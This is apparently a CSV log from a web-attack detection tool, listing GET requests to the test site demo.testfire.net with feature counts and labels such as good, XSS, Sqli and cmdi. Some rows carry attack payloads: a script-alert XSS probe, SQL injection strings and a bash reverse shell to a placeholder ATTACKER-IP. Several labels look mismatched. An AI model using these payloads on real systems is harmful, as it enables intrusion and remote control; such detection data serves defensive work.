GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=,(select * from (select(sleep(10)))a)",,0,0,0,4,3,0,0,0,2,0,1,0,0,XSS,0.9999
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=+OR+3409=3409+AND+('pytW'+LIKE+'pytY,,3,0,0,1,0,0,0,0,1,0,0,0,0,XSS,0.998
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query= ORDER BY 2--,,0,0,1,0,3,0,0,0,1,0,0,0,0,Sqli,0.8341
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=ruby+-e+""$(curl+-fsSL+https://raw.githubusercontent.com/Homebrew/install/master/install)""+<+/dev/null+2>+/dev/null",,0,2,0,1,0,2,0,0,0,0,0,0,6,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=bash+-i+>&+/dev/tcp/ATTACKER-IP/ATTACKER-PORT+0>&1,,0,0,0,0,0,2,0,0,0,0,0,1,6,cmdi,0.795
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=bash+-i+>&+/dev/tcp/ATTACKER-IP/ATTACKER-PORT+0>&1,,0,0,0,0,0,2,0,0,0,0,0,1,6,cmdi,0.795
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/106.206.77.3,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/106.206.77.3,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
